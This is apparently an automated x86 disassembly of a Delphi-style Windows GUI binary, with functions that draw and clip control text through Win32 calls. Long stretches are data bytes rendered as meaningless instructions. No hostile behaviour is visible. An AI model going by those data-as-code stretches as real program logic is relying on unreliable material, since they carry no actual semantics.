jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba56
retn
mov eax [ rw-data ]
call sub_403164
mov eax rw-data
call sub_403e9c
sub_42bbfe
inc ecx
add [ eax + 0x7c004033 ] ah
lds eax [ ecx ]
test al 0x33
inc eax
add [ eax - 0x6c ] ah
inc ebx
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx * 8 - 0x3bffffbd ] dl
inc ebx
add [ eax ] ch
mov [ ebx ] es
mov esp 0xbc004170
jno r-xdata
inc ebx
add [ ebx + esi * 2 + 0x73b80043 ] cl
add ah bl
inc ebp
mov eax eax
clc
mov esp 0x9070042
push esp
inc edi
jb r-xdata
add [ eax + 0x4400438d ] cl
fadd [ edx ]
jo r-xdata
inc ebx
add ah bl
dec esi
inc ebx
add [ eax * 2 + 0x50680043 ] dl
add ah dh
dec esi
inc ebx
add [ eax - 0x34 ] al
inc ecx
add [ eax ] ch
leave
inc ecx
add [ eax ] ah
leave
inc ecx
add [ eax - 0x34 ] cl
inc ecx
add [ ebx + ebx * 8 - 0x40ebffbe ] cl
inc ebx
add [ eax ] dh
les eax [ ebx ]
jl r-xdata
add [ eax ] 0x0
jne r-xdata
dec eax
int3
inc ebx
add [ eax + 0x20004388 ] ah
mov es [ ebx ]
and al 0x8e
inc ebx
add ah bl
mov [ ebx ] es
test [ ebx + eax * 2 + 0x43b8fc00 ] cl
add [ ebp + edx * 8 + 0x43 ] ah
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ eax - 0x48 ] ch
inc ebx
add [ esp + ebx * 8 + 0x42 ] dl
add [ ecx ] cl
push esp
inc edi
jb r-xdata
inc ebx
add ah bl
js r-xdata
aad 0x43
add [ eax ] al
les eax [ ebx ]
sub [ ebx + eax * 2 + 0x4170bc00 ] cl
add [ ecx + esi * 2 + 0x45dc0043 ] bh
inc ebx
add [ eax + 0x44 ] dl
inc ebx
add [ eax - 0x4fffbc47 ] dl
mov ecx 0xb6c80043
inc ebx
add [ eax - 0x63ffbcbd ] bl
inc ebx
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax [ ebx + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
push es
inc ebx
add [ ecx + edx * 2 ] cl
inc ebx
add [ ecx + edx * 2 ] bh
inc edx
outsd
js r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
jne r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ ecx ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_41dab4
jo r-xdata
and [ esi + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
pop eax
push es
inc ebx
add [ ecx ] ah
add bh bh
pushad
mov esp 0xbba40042
inc edx
add [ 0x74530800 ] dh
inc ebx
je r-xdata
add dh bh
xor [ edx + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
push [ eax ]
inc edx
outsd
js r-xdata
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x28ff0001 ] ah
mov edx 0xba4c0043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
add bh bh
lodsb [ esi ]
push edx
inc ebx
add al cl
push edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
in al 0x40
inc ebx
add ah bh
jo r-xdata
push ecx
insb
jae r-xdata
inc ebx
add al ah
dec edi
inc ebx
add ah dh
push edx
inc ebx
add [ eax - 0x3ffbcaf ] ah
xchg edx eax
inc ebx
add [ esp + esi * 2 ] bh
inc ebx
add [ edi + esi * 4 ] bl
inc ebx
add al bl
mov bh 0x43
add ah dl
mov dl 0x43
add [ edi + esi * 4 - 0x2417ffbd ] bh
inc edx
add al ch
jg r-xdata
inc ebx
add [ eax + 0x50 ] ch
sar al 0xbc
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] edx
outsd
inc [ eax ]
push edx
inc ebx
jae r-xdata
sub al 0x5
inc ebx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
xor eax [ eax + eax + 0x10 ]
inc eax
add [ eax - 0x3b00ffff ] ch
movsb [ edi ] [ esi ]
inc ebx
pop es
inc ebx
add [ eax + eax ] dh
call esp
jne r-xdata
inc esp
inc ebx
add ah bh
inc esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] dh
inc [ edx ]
pop ebx
add [ eax ] al
jmp [ eax ]
adc [ eax ] al
xor al 0xca
inc ebx
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb [ eax ] al
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] dl
push edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040017 ] al
outsd
outsb
je r-xdata
add bh bh
add [ edx + 0x43 ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
sbb bh bh
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
les esp [ ebx + eax * 2 + 0x100 ]
outsb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
insb
add eax 0x9b0043
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
add [ eax ] al
add [ eax + 0x1 ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
sub al 0x50
inc ebx
add [ ecx + esi * 2 + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
inc edx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
jo r-xdata
push cs
push eax
popad
je r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
jb r-xdata
jne r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebx + edi * 4 ]
outsb
jne r-xdata
outsb
je r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
cmp [ edx + 0x43 ] dl
add [ ecx ] al
add [ eax ] al
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
je r-xdata
outsb
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ eax + edx * 2 ]
adc [ eax ] al
cdq
add [ eax ] al
[ edx + edx * 2 + 0x43 ]
add [ edx + edx * 2 ] ah
mov edx 0xbb040043
push 0x6948776f
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
outsb
je r-xdata
sbb eax [ eax ]
or edx [ eax + 0x61 ]
adc [ eax ] al
test eax 0x58ff0001
mov edx 0x10043
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
and al 0x52
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add eax 0xba840043
inc ebx
add [ ebx + edi * 4 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ ecx + eax - 0x44e30100 ] ah
inc esp
add [ eax + eax ] bh
inc esp
push eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call eax
push edx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
0x80ff0000 0x4352
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_42cb42
inc edx
add [ eax + eax ] ch
add [ eax ] al
push eax
adc eax [ ebx ]
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al 0xcd
inc ecx
add [ edi ] bl
inc edx
add [ eax - 0x33 ] cl
inc ecx
add [ eax + 0x40 ] dh
inc ebx
add [ ebp + ecx * 8 + 0x41 ] bh
add [ ecx + eax * 2 ] bl
inc ebx
add ah cl
int3
sub_42cc00
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
int 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
int 0x42
add [ edx ] dh
int 0x42
add [ edx + eax ] cl
add [ eax ] al
hlt
sub_42cd74
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror dh 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3dffbd32 ] dl
into
inc edx
add [ eax ] bl
add al [ eax ]
add ah bh

sub_42d444
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ch dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 + 0x42 ] bl
add [ esi - 0x2b ] dh
inc edx
add [ edx + eax ] dl
add [ eax ] al
cld

sub_42db8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43d4b8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_4348c8
mov edx 0x69
mov eax esi
call sub_4348ec
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42dbe8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437954
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_4202e0
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_42023c
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_42dc54
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_42dff6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_4202e0
call sub_42b194
call sub_42b274
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_42023c
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43510c
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_4156e4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4156e4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x54 ]
call sub_40415c
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x58 ]
call sub_40435c
push eax
mov eax edi
call sub_4203c0
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_4156e4
mov eax ebx
mov si 0xffc8
call sub_403360
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41fcc0
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41fcc0
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4200a0
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41fcc0
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_4203c0
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dffd
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403ec0
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403ec0
lea eax [ ebp - 0x60 ]
call sub_40457c
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403ec0
retn
mov eax ebx
mov si 0xffc8
call sub_403360
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4200a0
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43510c
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43510c
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_420220
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_4156e4
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_4156e4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43510c
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4046c8
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_4203c0
push eax
call sub_42b194
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42b3dc
jmp r-xdata
call sub_42b194
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_42b440
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_4203c0
push eax
call sub_42b194
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42b330
push 0x0
mov eax edi
call sub_4203c0
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43510c
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_4373e0
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x80 ]
call sub_40415c
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x84 ]
call sub_40435c
push eax
mov eax edi
call sub_4203c0
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41fcc0
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x88 ]
call sub_40415c
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x8c ]
call sub_40435c
push eax
mov eax edi
call sub_4203c0
push eax
call DrawTextA
sub_42e007
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e082
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43510c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44ba70
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43ad6c
mov eax ebx
mov si 0xffb8
call sub_403360
test al al
je r-xdata
mov eax ebx
call sub_43be48
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e089
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_42e0d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43ca7c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_4348c8
mov edx 0x11
mov eax esi
call sub_4348ec
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_42b194
call sub_42b274
test al al
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_42e180
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e2d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4373e0
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_4202e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404164
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40415c
push eax
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ ebx + 0x160 ]
call sub_4203c0
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41f4f4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40415c
push eax
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ ebx + 0x160 ]
call sub_4203c0
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41f4f4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40415c
push eax
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ ebx + 0x160 ]
call sub_4203c0
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e2dd
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_42e2e7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_42e510
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41fddc
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41fcc0
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41fddc
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_420064
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403360
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403360
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_42e408
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_420440
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403360
xor edx edx
mov eax [ edi + 0x160 ]
call sub_420440
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403360
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_431eec
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_42e54c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42e510
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e5ac
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403360
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e5d4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4345dc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_42e638
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e6c5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e6cc
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43510c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44ba70
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403360
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_42e71c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4375e0
mov eax esi
mov edx [ r-xdata ]
call sub_403314
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_42e740
push ebx
mov ebx eax
mov eax ebx
call sub_44133c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42e778
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_42e7ce
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_42e7dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_437614
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
